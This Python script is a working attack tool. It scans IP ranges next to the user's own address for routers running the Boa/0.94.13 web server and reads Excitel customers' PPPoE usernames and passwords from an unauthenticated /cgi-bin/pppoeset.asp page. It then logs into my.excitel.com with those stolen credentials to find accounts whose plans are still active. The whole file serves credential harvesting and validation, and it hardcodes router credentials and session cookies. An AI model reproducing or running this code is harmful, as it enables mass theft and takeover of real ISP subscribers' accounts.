import ipaddress
import socket
import json
import requests
from bs4 import BeautifulSoup
import re
from datetime import datetime
import random

# Global variables
my_router_ip = "192.168.1.1"
my_router_username = "useradmin"
my_router_password = "123456"
my_router_threshold_ping_ms = 0.3


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def env(routerip, usernameofrouter, passwordofrouter, thresholdping):
    global my_router_ip
    global my_router_username
    global my_router_password
    global my_router_threshold_ping_ms
    my_router_ip = routerip
    my_router_username = usernameofrouter
    my_router_password = passwordofrouter
    my_router_threshold_ping_ms = thresholdping
    ip_man(grab_router_ip())


# TODO ignore for default values

def ip_man(ip):
    new_ip = ipaddress.IPv4Address(ip)
    for i in range(0, 257):
        port_check(new_ip - i)
        # TODO GO forward, not just backwards


def port_check(ip):
    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    a_socket.settimeout(my_router_threshold_ping_ms)  # Threshold, high ping gets thrown out
    location = (str(ip), 80)
    result_of_check = a_socket.connect_ex(location)

    if result_of_check == 0:
        print(bcolors.OKGREEN + "Port 80 is open in : " + str(ip) + bcolors.ENDC)
        a_socket.close()
        print(bcolors.WARNING + "Starting Head request to Identify Vulnerable Router Software Version " + bcolors.ENDC)
        print(bcolors.WARNING + "Vulnerable Version Found For " + str(ip) + bcolors.ENDC)
        info(str(ip))
    else:
        a_socket.close()


def info(ip):
    flag = 0
    burp0_url = "http://" + ip + ":80/robots.txt"
    burp0_headers = {"Connection": "close"}
    # burp0_headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0',
    #           'Connection': 'close'}
    try:
        agent_find = requests.head(burp0_url, headers=burp0_headers)
    except Exception as e:
        if "BadStatusLine" in str(e):
            print(bcolors.HEADER + "Unknown Server Version, Skipping This IP: " + str(ip) + bcolors.ENDC)
            flag = 1
    if flag == 0:
        temp = str(agent_find.headers)
        temp.rstrip()
        temp = temp.replace("\'", "\"")
        serverinfo = json.loads(temp)
        server_version = serverinfo['Server']
        if server_version == "Boa/0.94.13":
            # print(ip)
            pppoe(ip)
        else:
            pass


def pppoe(ip):
    ppoe_url = "http://" + ip + "/cgi-bin/pppoeset.asp"
    response = requests.get(ppoe_url)
    response_text = response.text
    response_status = response.status_code
    soup = BeautifulSoup(response_text, "html.parser")
    if response_status == 200:
        Servicename = soup.find('input', {'id': 'Servicename'}).get('value')
        Username = soup.find('input', {'id': 'Username'}).get('value')
        Password = soup.find('input', {'id': 'Password'}).get('value')
        if Servicename == "excitel":
            print(bcolors.WARNING + "Potential Account Found IP: " + str(ip) + bcolors.ENDC)
            print(bcolors.OKGREEN + "Username : " + Username + " Password: " + Password + bcolors.ENDC)
            print(bcolors.WARNING + "Starting Balance Check " + bcolors.ENDC)
            balance_check(Username, Password)
        else:
            print(bcolors.HEADER + "PPPOE page not found skipping IP " + str(ip) + bcolors.ENDC)
    elif response_status == 404:
        print(bcolors.HEADER + "Not Vulnerable IP " + str(ip) + bcolors.ENDC)
    elif response_status == 401:
        print(bcolors.HEADER + "Url Not Found in IP " + str(ip) + bcolors.ENDC)
    else:
        print(bcolors.HEADER + "Other Error Log this issue in github with this status code: " + str(
            response_status) + bcolors.ENDC)


def balance_check(username, password):
    burp0_url = "https://my.excitel.com:443/api/selfcare/public/index.php/login"
    burp0_cookies = {"selfcare": "r0ln3dip6aj3fathncdi61vq70", "__zlcmid": "157kBdV7PW215ZC"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
                     "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5",
                     "Accept-Encoding": "gzip, deflate",
                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "Origin": "https://my.excitel.com", "Dnt": "1",
                     "Referer": "https://my.excitel.com/login?returnUrl=%2Flogin%3FreturnUrl%3D%252Flogin",
                     "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
                     "Te": "trailers",
                     "Connection": "close"}
    burp0_data = {"username": username, "password": password, "isMobile": "0"}
    data = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    full_json = json.loads(data.text)
    user_login = full_json['status']['code']
    if user_login == 200:
        expiry_date_time = full_json['result']['subscriberData']['serviceExpirationDate']
        plan_date = expiry_date_time.partition(' ')[0]
        past = datetime.strptime(plan_date, "%Y-%m-%d")
        present = datetime.now()
        if past.date() < present.date():
            print(bcolors.HEADER + "Account expired for " + username + bcolors.ENDC)

        else:
            print(bcolors.OKGREEN + "User Account active with a plan " + bcolors.ENDC)
            print(bcolors.OKGREEN + "Username = " + username + " Password = " + password + bcolors.ENDC)

    else:
        print(bcolors.HEADER + "User deleted " + username + bcolors.ENDC)


def grab_router_ip():
    cookies = {
        '$LoginTimes': '1',
        'SESSIONID': random_session(),
        'UID': my_router_username,
        'PSW': my_router_password,
    }

    headers = {
        '$Host': my_router_ip,
        '$User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
        '$Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        '$Accept-Language': 'en-US,en;q=0.5',
        '$Accept-Encoding': 'gzip, deflate',
        '$Content-Type': 'application/x-www-form-urlencoded',
        '$Content-Length': '136',
        '$Origin': 'http://' + my_router_ip,
        '$DNT': '1',
        '$Connection': 'close',
        '$Referer': 'http://' + my_router_ip + '/cgi-bin/index2.asp',
        '$Upgrade-Insecure-Requests': '1',
    }
    regex = """"N/A\,\,(.*?)\,";\r\n		var"""
    data = '$Username=' + my_router_username + '&Logoff=0&hLoginTimes=1&hLoginTimes_Zero=0&value_one=1&Password1=' + my_router_password + '&Password2=' + my_router_password + '&logintype=usr&Password=' + my_router_password

    response = requests.post("http://" + my_router_ip + "/cgi-bin/sta-device.asp", headers=headers, cookies=cookies,
                             data=data,
                             allow_redirects=True)

    html = response.text
    area_ip = re.findall(regex, html)
    area_ip1 = ipaddress.IPv4Address(area_ip[0])
    print(bcolors.OKGREEN + "Current IP found : " + str(area_ip1) + bcolors.ENDC)
    print(bcolors.WARNING + "Starting IP Scan " + bcolors.ENDC)
    return area_ip1


def random_session():
    seed = random.randint(100000000000, 999999999999)
    hex16 = hex(seed).lstrip("0x").rstrip("L")[0:8]
    return 'boasid' + hex16
